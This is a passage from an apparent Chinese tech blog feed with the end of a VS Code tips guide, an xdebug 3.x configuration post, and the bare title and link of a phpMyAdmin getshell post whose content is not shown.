align="left">F2</td><td align="left">F2</td><td align="left">以重构的方式进行<strong>重命名</strong></td><td align="left">改代码备</td></tr><tr><td align="left">Ctrl + J</td><td align="left"></td><td align="left">将多行代码合并为一行</td><td align="left">Win 用户可在命令面板搜索”合并行“</td></tr><tr><td align="left">Cmd +</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">Cmd + U</td><td align="left">Ctrl + U</td><td align="left">将光标的移动回退到上一个位置</td><td align="left">撤销光标的移动和选择</td></tr></tbody></table><h3 id="8、搜索相关"><a href="#8、搜索相关" class="headerlink" title="8、搜索相关"></a>8、搜索相关</h3><table><thead><tr><th align="left">Mac 快捷键</th><th align="left">Win 快捷键</th><th align="left">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left"><strong>Cmd + Shift + F</strong></td><td align="left"><strong>Ctrl + Shift +F</strong></td><td align="left">全局搜索代码</td><td align="left">很常用</td></tr><tr><td align="left"><strong>Cmd + P</strong></td><td align="left"><strong>Ctrl + P</strong></td><td align="left">在当前的项目工程里，<strong>全局</strong>搜索文件名</td><td align="left"></td></tr><tr><td align="left">Cmd + F</td><td align="left">Ctrl + F</td><td align="left">在当前文件中搜索代码，光标在搜索框里</td><td align="left"></td></tr><tr><td align="left"><strong>Cmd + G</strong></td><td align="left"><strong>F3</strong></td><td align="left">在当前文件中搜索代码，光标仍停留在编辑器里</td><td align="left">很巧妙</td></tr></tbody></table><h3 id="9、自定义快捷键"><a href="#9、自定义快捷键" class="headerlink" title="9、自定义快捷键"></a>9、自定义快捷键</h3><p>按住快捷键「Cmd + Shift + P」，弹出命令面板，在命令面板中输入“快捷键”，可以进入快捷键的设置。</p><p>当然，你也可以选择菜单栏「偏好设置 –&gt; 键盘快捷方式」，进入快捷键的设置：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190329_2120.png"></p><h3 id="10、快捷键列表"><a href="#10、快捷键列表" class="headerlink" title="10、快捷键列表"></a>10、快捷键列表</h3><p>你可以点击 VS Code 左下角的齿轮按钮，效果如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190418_1738.png"></p><p>上图中，在展开的菜单中选择「键盘快捷方式」，就可以查看和修改所有的快捷键列表了：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190418_1739_2.png"></p><h3 id="快捷键参考链接"><a href="#快捷键参考链接" class="headerlink" title="快捷键参考链接"></a>快捷键参考链接</h3><ul><li>快捷键速查表[官方]：<a href="https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf">https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf</a></li></ul><h2 id="三、VS-Code-常见配置"><a href="#三、VS-Code-常见配置" class="headerlink" title="三、VS Code 常见配置"></a>三、VS Code 常见配置</h2><h3 id="1、VS-Code-设置为中文语言"><a href="#1、VS-Code-设置为中文语言" class="headerlink" title="1、VS Code 设置为中文语言"></a>1、VS Code 设置为中文语言</h3><p>直接安装插件<code>Chinese (Simplified) Language Pack for Visual Studio Code</code></p><h3 id="2、Breadcrumb"><a href="#2、Breadcrumb" class="headerlink" title="2、Breadcrumb"></a>2、Breadcrumb</h3><p>Breadcrumb可以使得我们打开当前文件时能够看到层级结构</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190415_2009.png"></p><p><strong>设置步骤：</strong></p><p>打开 VS Code 的设置项，选择「用户设置 -&gt; 工作台 -&gt; 导航路径」，如下图所示：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20191108_1550.png"></p><p>上图中，将红框部分打钩即可。</p><h3 id="3、左右显示多个编辑器窗口"><a href="#3、左右显示多个编辑器窗口" class="headerlink" title="3、左右显示多个编辑器窗口"></a>3、左右显示多个编辑器窗口</h3><p>Mac 用户按住快捷键 <code>Cmd + \</code>， Windows 用户按住快捷键<code>Ctrl + \</code>，即可同时打开多个编辑器窗口，效果如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200619_0030.gif"></p><p>按快捷键「Cmd + 1 」切换到左边的窗口，按快捷键「Cmd + 2 」切换到右边的窗口。随时随地，想切就切。</p><p>在使用的时候可以直接按快捷键「Cmd + 2」，直接就会分出第二个窗口</p><h3 id="4、是否显示代码的行号"><a href="#4、是否显示代码的行号" class="headerlink" title="4、是否显示代码的行号"></a>4、是否显示代码的行号</h3><p>VS Code 默认显示代码的行号。你可以在设置项里搜索 <code>editor.lineNumbers</code>修改设置，配置项如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190417_2140.png"></p><p>我建议保留这个设置项，无需修改。</p><h3 id="5、右侧是否显示代码的缩略图"><a href="#5、右侧是否显示代码的缩略图" class="headerlink" title="5、右侧是否显示代码的缩略图"></a>5、右侧是否显示代码的缩略图</h3><p>VS Code 会在代码的右侧，默认显示缩略图。你可以在设置项里搜索 <code>editor.minimap</code>进行设置，配置项如下：</p><p><img src="http://img.smyhvae.com/20190417_2156.png"></p><h3 id="6、将当前行代码高亮显示（更改光标所在行的背景色）"><a href="#6、将当前行代码高亮显示（更改光标所在行的背景色）" class="headerlink" title="6、将当前行代码高亮显示（更改光标所在行的背景色）"></a>6、将当前行代码高亮显示（更改光标所在行的背景色）</h3><p>当我们把光标放在某一行时，这一行的背景色并没有发生变化。如果想<strong>高亮显示</strong>当前行的代码，需要设置两步：</p><p>（1）在设置项里搜索<code>editor.renderLineHighlight</code>，将选项值设置为<code>all</code>或者<code>line</code>。</p><p>（2）在设置项里增加如下内容：</p><div class="hljs code-wrapper"><pre><code class="hljs json">&quot;workbench.colorCustomizations&quot;: &#123;    &quot;editor.lineHighlightBackground&quot;: &quot;#00000090&quot;,    &quot;editor.lineHighlightBorder&quot;: &quot;#ffffff30&quot;&#125;</code></pre></div><p>上方代码，第一行代码的意思是：修改光标所在行的背景色（背景色设置为全黑，不透明度 90%）；第二行代码的意思是：修改光标所在行的边框色。</p><h3 id="7、改完代码后立即自动保存"><a href="#7、改完代码后立即自动保存" class="headerlink" title="7、改完代码后立即自动保存"></a>7、改完代码后立即自动保存</h3><p><strong>方式一</strong>：</p><p>改完代码后，默认不会自动保存。你可以在设置项里搜索<code>files.autoSave</code>，修改配置项如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190417_2216.png"></p><p>上图中，我们将配置项修改为<code>onFocusChange</code>之后，那么，当光标离开该文件后，这个文件就会自动保存了。<strong>非常方便</strong>。</p><p><strong>方式二</strong>：</p><p>当然，你也可以直接在菜单栏选择「文件-自动保存」。勾选后，当你写完代码后，文件会立即实时保存。</p><h3 id="8、保存代码后，是否立即格式化"><a href="#8、保存代码后，是否立即格式化" class="headerlink" title="8、保存代码后，是否立即格式化"></a>8、保存代码后，是否立即格式化</h3><p>保存代码后，默认<strong>不会立即</strong>进行代码的格式化。你可以在设置项里搜索<code>editor.formatOnSave</code>查看该配置项：</p><p><img src="http://img.smyhvae.com/20190417_2213.png"></p><p>我觉得这个配置项保持默认就好，不用打钩。</p><h3 id="9、空格-or-制表符"><a href="#9、空格-or-制表符" class="headerlink" title="9、空格 or 制表符"></a>9、空格 or 制表符</h3><p>VS Code 会根据你所打开的文件来决定该使用空格还是制表。也就是说，如果你的项目中使用的都是制表符，那么，当你在写新的代码时，按下 tab 键后，编辑器就会识别成制表符。</p><p>常见的设置项如下：</p><ul><li><strong>editor.detectIndentation</strong>：自动检测（默认开启）。截图如下：</li></ul><p><img src="http://img.smyhvae.com/20190417_2205.png"></p><ul><li><strong>editor.insertSpaces</strong>：按 Tab 键时插入空格（默认）。截图如下：</li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190417_2207.png"></p><ul><li><strong>editor.tabSize</strong>：一个制表符默认等于四个空格。截图如下：</li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190417_2209.png"></p><h3 id="10、新建文件后的默认文件类型"><a href="#10、新建文件后的默认文件类型" class="headerlink" title="10、新建文件后的默认文件类型"></a>10、新建文件后的默认文件类型</h3><p>当我们按下快捷键「Cmd + N」新建文件时，VS Code 默认无法识别这个文件到底是什么类型的，因此也就无法识别相应的语法高亮。</p><p>如果你想修改默认的文件类型，可以在设置项里搜索<code>files.defaultLanguage</code>，设置项如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190417_2221.png"></p><p>上图中的红框部分，填入你期望的默认文件类型。我填的是<code>html</code>类型，你也可以填写成 <code>javascript</code> 或者 <code>markdown</code>，或者其他的语言类型。</p><h3 id="11、删除文件时，是否弹出确认框"><a href="#11、删除文件时，是否弹出确认框" class="headerlink" title="11、删除文件时，是否弹出确认框"></a>11、删除文件时，是否弹出确认框</h3><p>当我们在 VS Code 中删除文件时，默认会弹出确认框。如果你想修改设置，可以在设置项里搜索<code>xplorer.confirmDelete</code>。截图如下：</p><p><img src="http://img.smyhvae.com/20190418_1758.png"></p><p>我建议这个设置项保持默认的打钩就好，不用修改。删除文件前的弹窗提示，也是为了安全考虑，万一手贱不小心删了呢？</p><blockquote><p>接下来，我们来讲一些更高级的配置。</p></blockquote><h3 id="12、文件对比"><a href="#12、文件对比" class="headerlink" title="12、文件对比"></a>12、文件对比</h3><p>VS Code 默认支持<strong>对比两个文件的内容</strong>。选中两个文件，然后右键选择「将已选项进行比较」即可，效果如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190329_1756.png"></p><p>VS Code 自带的对比功能并不够强大，我们可以安装插件<code>compareit</code>，进行更丰富的对比。比如说，安装完插件<code>compareit</code>之后，我们可以将「当前文件」与「剪切板」里的内容进行对比：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190329_1757.png"></p><h3 id="13、查找某个函数在哪些地方被调用了"><a href="#13、查找某个函数在哪些地方被调用了" class="headerlink" title="13、查找某个函数在哪些地方被调用了"></a>13、查找某个函数在哪些地方被调用了</h3><p>比如我已经在<code>a.js</code>文件里调用了 <code>foo()</code>函数。那么，如果我想知道<code>foo()</code>函数在其他文件中是否也被调用了，该怎么做呢？</p><p>做法如下：在 <code>a.js</code> 文件里，选中<code>foo()</code>函数（或者将光标放置在<code>foo()</code>函数上），然后按住快捷键「Shift + F12」，就能看到 <code>foo()</code>函数在哪些地方被调用了，比较实用。</p><h3 id="14、鼠标操作"><a href="#14、鼠标操作" class="headerlink" title="14、鼠标操作"></a>14、鼠标操作</h3><ul><li><p>在当前行的位置，鼠标三击，可以选中当前行。</p></li><li><p>用鼠标单击文件的<strong>行号</strong>，可以选中当前行。</p></li><li><p>在某个<strong>行号</strong>的位置，<strong>上下移动鼠标，可以选中多行</strong>。</p></li></ul><h3 id="15、重构"><a href="#15、重构" class="headerlink" title="15、重构"></a>15、重构</h3><p>重构分很多种，我们来举几个例子。</p><p><strong>命名重构</strong>：</p><p>当我们尝试去修改某个函数（或者变量名）时，我们可以把光标放在上面，然后按下「F2」键，那么，这个函数（或者变量名）出现的地方都会被修改。</p><p><strong>方法重构</strong>：</p><p>选中某一段代码，这个时候，代码的左侧会出现一个「灯泡图标」，点击这个图标，就可以把这段代码提取为一个单独的函数。</p><h3 id="16、在当前文件中搜索"><a href="#16、在当前文件中搜索" class="headerlink" title="16、在当前文件中搜索"></a>16、在当前文件中搜索</h3><p>在上面的快捷键列表中，我们已经知道如下快捷键：</p><ul><li><p>Cmd + F（Win 用户是 Ctrl + F）：在当前文件中搜索，光标在搜索框里</p></li><li><p>Cmd + G（Win 用户是 F3）：在当前文件中搜索，光标仍停留在编辑器里</p></li></ul><p>另外，你可能会注意到，搜索框里有很多按钮，每个按钮都对应着不同的功能，如下图所示：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190415_2052.png"></p><p>上图中，你可以通过「Tab」键和「Shift + Tab」键在输入框和替换框之间进行切换。</p><p>「在选定内容中查找」这个功能还是比较实用的。你也可以在设置项里搜索 <code>editor.find.autoFindInSelection</code>，勾选该设置项后，那么，当你选中指定内容后，然后按住「Cmd + F」，就可以<strong>自动</strong>只在这些内容里进行查找。该设置项如下图所示：</p><p><img src="http://img.smyhvae.com/20191108_1655.png"></p><h3 id="17、全局搜索"><a href="#17、全局搜索" class="headerlink" title="17、全局搜索"></a>17、全局搜索</h3><p>在上面的快捷键列表中，我们已经知道如下快捷键：</p><ul><li>Cmd + Shift + F（Win 用户是 Ctrl + Shift +F）：在全局的文件夹中进行搜索。效果如下：</li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190415_2107.png"></p><p>上图中，你可以点击红框部分，展开更多的配置项。</p><h3 id="18、Git-版本管理"><a href="#18、Git-版本管理" class="headerlink" title="18、Git 版本管理"></a>18、Git 版本管理</h3><p>VS Code 自带了 Git 版本管理，如下图所示：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190418_1850.png"></p><p>上图中，我们可以在这里进行常见的 git 命令操作。如果你还不熟悉 <strong>Git 版本管理</strong>，可以先去补补课。</p><p>与此同时，我建议安装插件<code>GitLens</code>，它是 VS Code 中我最推荐的一个插件，简直是 Git 神器，码农必备。</p><h3 id="19、将工作区放大-缩小"><a href="#19、将工作区放大-缩小" class="headerlink" title="19、将工作区放大/缩小"></a>19、将工作区放大/缩小</h3><p>我们在上面的设置项里修改字体大小后，仅仅只是修改了代码的字体大小。</p><p>如果你想要缩放整个工作区（包括代码的字体、左侧导航栏的字体等），可以按下快捷键「**cmd +/-**」。windows 用户是按下「ctrl +/-」</p><p><strong>当我们在投影仪上给别人演示代码的时候，这一招十分管用</strong>。</p><p>如果你想恢复默认的工作区大小，可以在命令面板输入<code>重置缩放</code>（英文是<code>reset zoom</code>）</p><h3 id="20、创建多层子文件夹"><a href="#20、创建多层子文件夹" class="headerlink" title="20、创建多层子文件夹"></a>20、创建多层子文件夹</h3><p>我们可以在新建文件夹的时候，如果直接输入<code>aa/bb/cc</code>，比如：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190418_2022.png"></p><p>那么，就可以创建多层子文件夹，效果如下：</p><p><img src="http://img.smyhvae.com/20190418_2023.png"></p><h3 id="21、-vscode-文件夹的作用"><a href="#21、-vscode-文件夹的作用" class="headerlink" title="21、.vscode 文件夹的作用"></a>21、<code>.vscode</code> 文件夹的作用</h3><p>为了统一团队的 vscode 配置，我们可以在项目的根目录下建立<code>.vscode</code>目录，在里面放置一些配置内容，比如：</p><ul><li><p><code>settings.json</code>：工作空间设置、代码格式化配置、插件配置。</p></li><li><p><code>sftp.json</code>：ftp 文件传输的配置。</p></li></ul><p><code>.vscode</code>目录里的配置只针对当前项目范围内生效。将<code>.vscode</code>提交到代码仓库，大家统一配置时，会非常方便。</p><h3 id="22、自带终端"><a href="#22、自带终端" class="headerlink" title="22、自带终端"></a>22、自带终端</h3><p>我们可以按下「Ctrl + `」打开 VS Code 自带的终端。我认为内置终端并没有那么好用，我更建议你使用第三方的终端 <strong>item2</strong>。</p><h3 id="23、markdown-语法支持"><a href="#23、markdown-语法支持" class="headerlink" title="23、markdown 语法支持"></a>23、markdown 语法支持</h3><p>VS Code 自带 markdown 语法高亮。也就是说，如果你是用 markdown 格式写文章，则完全可以用 VS Code 进行写作。</p><p>写完 md 文件之后，你可以点击右上角的按钮进行预览，如下图所示：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190418_1907.png"></p><p>我一般是安装「Markdown Preview Github Styling」插件，以 GitHub 风格预览 Markdown 样式。样式十分简洁美观。</p><p>你也可以在控制面板输入<code>Markdown: 打开预览</code>，直接全屏预览 markdown 文件。</p><h3 id="24、Emmet-in-VS-Code"><a href="#24、Emmet-in-VS-Code" class="headerlink" title="24、Emmet in VS Code"></a>24、Emmet in VS Code</h3><p><code>Emmet</code>可以极大的提高 html 和 css 的编写效率，它提供了一种非常简练的语法规则。</p><p>举个例子，我们在编辑器中输入缩写代码：<code>ul&gt;li*6</code> ，然后按下 Tab 键，即可得到如下代码片段：</p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></code></pre></div><p>VS Code 默认支持 Emmet。更多 Emmet 语法规则，请自行查阅。</p><h3 id="25、修改字体，使用「Fira-Code」字体"><a href="#25、修改字体，使用「Fira-Code」字体" class="headerlink" title="25、修改字体，使用「Fira Code」字体"></a>25、修改字体，使用「Fira Code」字体</h3><p>这款字体很漂亮，很适合用来写代码：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200516_1633.png"></p><p>安装步骤如下：</p><p>（1）进入 <a href="https://github.com/tonsky/FiraCode">https://github.com/tonsky/FiraCode</a> 网站，下载并安装「Fira Code」字体。</p><p>（2）打开 VS Code 的「设置」，搜索<code>font</code>，修改相关配置为如下内容：</p><div class="hljs code-wrapper"><pre><code class="hljs json">&quot;editor.fontFamily&quot;: &quot;&#x27;Fira Code&#x27;,Menlo, Monaco, &#x27;Courier New&#x27;, monospace&quot;, // 设置字体显示&quot;editor.fontLigatures&quot;: false,//控制是否启用字体连字，true启用，false不启用</code></pre></div><p>上方的第二行配置，取决于个人习惯，我是直接设置为<code>&quot;editor.fontLigatures&quot;: null</code>，因为我不太习惯连字。</p><h3 id="26、代码格式化：Prettier"><a href="#26、代码格式化：Prettier" class="headerlink" title="26、代码格式化：Prettier"></a>26、代码格式化：Prettier</h3><p>我们可以使用 <code>Prettier</code>进行代码格式化，会让代码的展示更加美观。步骤如下：</p><p>（1）安装插件 <code>Prettier</code>。</p><p>（2）在项目的根路径下，新建文件<code>.prettierrc</code>，并在文件中添加如下内容：</p><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;printWidth&quot;</span>: <span class="hljs-number">150</span>,  <span class="hljs-attr">&quot;tabWidth&quot;</span>: <span class="hljs-number">4</span>,  <span class="hljs-attr">&quot;semi&quot;</span>: <span class="hljs-literal">true</span>,  <span class="hljs-attr">&quot;singleQuote&quot;</span>: <span class="hljs-literal">true</span>,  <span class="hljs-attr">&quot;trailingComma&quot;</span>: <span class="hljs-string">&quot;es5&quot;</span>,  <span class="hljs-attr">&quot;tslintIntegration&quot;</span>: <span class="hljs-literal">true</span>,  <span class="hljs-attr">&quot;insertSpaceBeforeFunctionParenthesis&quot;</span>: <span class="hljs-literal">false</span>&#125;</code></pre></div><p>上面的内容，是我自己的配置，你可以参考。</p><p>更多配置，可以参考官方文档：<a href="https://prettier.io/docs/en/options.html">https://prettier.io/docs/en/options.html</a></p><h3 id="27、文件传输：sftp"><a href="#27、文件传输：sftp" class="headerlink" title="27、文件传输：sftp"></a>27、文件传输：sftp</h3><p>如果你需要将本地文件通过 ftp 的形式上传到局域网的服务器，可以安装<code>sftp</code>这个插件，很好用。在公司会经常用到。</p><p>步骤如下：</p><p>（1）安装插件<code>sftp</code>。</p><p>（2）配置 <code>sftp.json</code>文件。 插件安装完成后，输入快捷键「cmd+shift+P」弹出命令面板，然后输入<code>sftp:config</code>，回车，当前工程的<code>.vscode</code>文件夹下就会自动生成一个<code>sftp.json</code>文件，我们需要在这个文件里配置的内容可以是：</p><ul><li><p><code>host</code>：服务器的 IP 地址</p></li><li><p><code>username</code>：用户名</p></li><li><p><code>privateKeyPath</code>：存放在本地的已配置好的用于登录工作站的密钥文件（也可以是 ppk 文件）</p></li><li><p><code>remotePath</code>：工作站上与本地工程同步的文件夹路径，需要和本地工程文件根目录同名，且在使用 sftp 上传文件之前，要手动在工作站上 mkdir 生成这个根目录</p></li><li><p><code>ignore</code>：指定在使用 sftp: sync to remote 的时候忽略的文件及文件夹，注意每一行后面有逗号，最后一行没有逗号</p></li></ul><p>举例如下：(注意，其中的注释需要去掉)</p><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;host&quot;</span>: <span class="hljs-string">&quot;192.168.xxx.xxx&quot;</span>, <span class="hljs-comment">//服务器ip</span>  <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">22</span>, <span class="hljs-comment">//端口，sftp模式是22</span>  <span class="hljs-attr">&quot;username&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-comment">//用户名</span>  <span class="hljs-attr">&quot;password&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-comment">//密码</span>  <span class="hljs-attr">&quot;protocol&quot;</span>: <span class="hljs-string">&quot;sftp&quot;</span>, <span class="hljs-comment">//模式</span>  <span class="hljs-attr">&quot;agent&quot;</span>: <span class="hljs-literal">null</span>,  <span class="hljs-attr">&quot;privateKeyPath&quot;</span>: <span class="hljs-literal">null</span>,  <span class="hljs-attr">&quot;passphrase&quot;</span>: <span class="hljs-literal">null</span>,  <span class="hljs-attr">&quot;passive&quot;</span>: <span class="hljs-literal">false</span>,  <span class="hljs-attr">&quot;interactiveAuth&quot;</span>: <span class="hljs-literal">false</span>,  <span class="hljs-attr">&quot;remotePath&quot;</span>: <span class="hljs-string">&quot;/root/node/build/&quot;</span>, <span class="hljs-comment">//服务器上的文件地址</span>  <span class="hljs-attr">&quot;context&quot;</span>: <span class="hljs-string">&quot;./server/build&quot;</span>, <span class="hljs-comment">//本地的文件地址</span>  <span class="hljs-attr">&quot;uploadOnSave&quot;</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">//监听保存并上传</span>  <span class="hljs-attr">&quot;syncMode&quot;</span>: <span class="hljs-string">&quot;update&quot;</span>,  <span class="hljs-attr">&quot;watcher&quot;</span>: &#123;    <span class="hljs-comment">//监听外部文件</span>    <span class="hljs-attr">&quot;files&quot;</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//外部文件的绝对路径</span>    <span class="hljs-attr">&quot;autoUpload&quot;</span>: <span class="hljs-literal">false</span>,    <span class="hljs-attr">&quot;autoDelete&quot;</span>: <span class="hljs-literal">false</span>  &#125;,  <span class="hljs-attr">&quot;ignore&quot;</span>: [    <span class="hljs-comment">//忽略项</span>    <span class="hljs-string">&quot;**/.vscode/**&quot;</span>,    <span class="hljs-string">&quot;**/.git/**&quot;</span>,    <span class="hljs-string">&quot;**/.DS_Store&quot;</span>  ]&#125;</code></pre></div><p>（3）在 VS Code 的当前文件里，选择「右键 -&gt; upload」，就可以将本地的代码上传到 指定的 ftp 服务器上（也就是在上方 <code>host</code> 中配置的服务器 ip）。</p><p>我们还可以选择「右键 -&gt; Diff with Remote」，就可以将本地的代码和 ftp 服务器上的代码做对比。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://github.com/qianguyihao/Web">https://github.com/qianguyihao/Web</a></li><li><a href="https://thedarkbay797951995.wordpress.com/2020/08/15/install-vs-code-in-kali-linux/">Install Visual Studio Code (VS Code) Editor in Kali linux</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
      <category>vscode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vscode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xdebug v3.x.x配置变化</title>
    <link href="/2020/12/24/xdebug-v3-x-x%E9%85%8D%E7%BD%AE%E5%8F%98%E5%8C%96/"/>
    <url>/2020/12/24/xdebug-v3-x-x%E9%85%8D%E7%BD%AE%E5%8F%98%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>给新装的虚拟机安装lamp环境，安装到xdebug的时候突然怎么也断不下来，怎么回事？？？原来是xdebug新版本的配置文件写法有了变化：</p><h1 id="老版本配置"><a href="#老版本配置" class="headerlink" title="老版本配置"></a>老版本配置</h1><p>版本为2.xx的xdebug：</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">zend_extension</span>=xdebug.so <span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_autostart</span>=<span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_host</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-attr">xdebug.remote_port</span>=<span class="hljs-number">9000</span><span class="hljs-attr">xdebug.remote_handler</span>=dbgp<span class="hljs-attr">xdebug.idekey</span>=PHPSTORM</code></pre></div><h1 id="官网更新说明"><a href="#官网更新说明" class="headerlink" title="官网更新说明"></a>官网更新说明</h1><p>PHP Debug Adapter for Visual Studio Code 一文中对3.xx版本的xdebug配置变化进行了说明：</p><p>Enable remote debugging in your php.ini:</p><p>For XDebug v3.x.x:</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">xdebug.mode</span> = debug<span class="hljs-attr">xdebug.start_with_request</span> = <span class="hljs-literal">yes</span><span class="hljs-attr">xdebug.client_port</span> = <span class="hljs-number">9000</span></code></pre></div><p>For XDebug v2.x.x:</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">xdebug.remote_enable</span> = <span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_autostart</span> = <span class="hljs-number">1</span></code></pre></div><p>所以新版配置如下：</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">zend_extension</span>=xdebug.so <span class="hljs-attr">xdebug.mode</span> = debug <span class="hljs-attr">xdebug.start_with_request</span> = <span class="hljs-literal">yes</span> <span class="hljs-attr">xdebug.client_port</span> = <span class="hljs-number">9000</span> <span class="hljs-attr">xdebug.remote_host</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-attr">xdebug.remote_handler</span>=dbgp <span class="hljs-attr">xdebug.idekey</span>=PHPSTORM</code></pre></div><p>vscode lauch.json</p><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;    <span class="hljs-comment">// Use IntelliSense to learn about possible attributes.</span>    <span class="hljs-comment">// Hover to view descriptions of existing attributes.</span>    <span class="hljs-comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span>    <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.2.0&quot;</span>,    <span class="hljs-attr">&quot;configurations&quot;</span>: [        &#123;            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Listen for XDebug&quot;</span>,            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;php&quot;</span>,            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,            <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">9000</span>        &#125;,        &#123;            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Launch currently open script&quot;</span>,            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;php&quot;</span>,            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,            <span class="hljs-attr">&quot;program&quot;</span>: <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span>,            <span class="hljs-attr">&quot;cwd&quot;</span>: <span class="hljs-string">&quot;$&#123;fileDirname&#125;&quot;</span>,            <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">9000</span>        &#125;    ]&#125;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
      <category>xdebug</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xdebug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpmyadmin 后台 getshell 及漏洞利用思路整理</title>
    <link href="/2020/11/21/phpmyadmin-%E5%90%8E%E5%8F%B0-getshell-%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/"/>
    <url>/2020/11/21/phpmyadmin-%E5%90%8E%E5%8F%B0-getshell-%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/</url>
    
